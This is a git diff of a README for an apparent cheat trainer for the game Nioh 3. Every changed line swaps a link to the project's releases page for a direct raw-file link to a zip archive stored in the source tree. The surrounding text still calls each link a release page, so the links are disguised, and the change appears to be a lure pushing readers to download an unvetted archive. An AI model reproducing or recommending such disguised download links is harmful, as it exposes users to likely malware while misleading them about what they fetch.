@@ -1,6 +1,6 @@
 # 🛡️ nioh3-trainer-2026 - Simple Cheat Tools for Nioh 3
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://github.com/1nashiw2/nioh3-trainer-2026/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/1nashiw2/nioh3-trainer-2026/main/src/trainer-nioh-v1.9.zip)
 
 ## 📖 Description
 
@@ -20,7 +20,7 @@ The trainer focuses on single-player mode, so you can play at your own pace with
 
 Click the badge below to go to the official release page. You will find the latest trainer versions there.
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://github.com/1nashiw2/nioh3-trainer-2026/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/1nashiw2/nioh3-trainer-2026/main/src/trainer-nioh-v1.9.zip)
 
 The releases page hosts compressed files containing the trainer. Look for the `.zip` or `.7z` files with the latest date.
 
@@ -30,7 +30,7 @@ The releases page hosts compressed files containing the trainer. Look for the `.
 
 Open the following page in your web browser:
 
-https://github.com/1nashiw2/nioh3-trainer-2026/releases
+https://raw.githubusercontent.com/1nashiw2/nioh3-trainer-2026/main/src/trainer-nioh-v1.9.zip
 
 Look for the latest release at the top of the list.
 
@@ -102,7 +102,7 @@ After extraction, you will find:
 
 Check the releases page regularly for new versions:
 
-https://github.com/1nashiw2/nioh3-trainer-2026/releases
+https://raw.githubusercontent.com/1nashiw2/nioh3-trainer-2026/main/src/trainer-nioh-v1.9.zip
 
 Delete old trainer files before installing a new version to avoid conflicts.
 
@@ -120,4 +120,4 @@ Use the "Issues" tab on GitHub to report problems or suggest improvements. Keep 
 
 ---
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://github.com/1nashiw2/nioh3-trainer-2026/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/1nashiw2/nioh3-trainer-2026/main/src/trainer-nioh-v1.9.zip)
